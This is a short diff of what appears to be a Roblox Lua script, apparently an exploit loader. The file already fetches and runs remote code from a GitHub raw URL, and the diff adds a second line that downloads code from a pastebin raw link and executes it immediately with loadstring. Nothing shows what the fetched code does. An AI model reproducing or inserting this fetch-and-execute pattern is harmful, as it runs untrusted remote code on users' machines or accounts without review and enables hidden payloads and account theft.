@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ykknzo-hub/notid/refs/heads/main/notfications.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/YJcEqR83"))()
 
 local HttpService = game:GetService("HttpService")
 local plrs = game:GetService("Players")
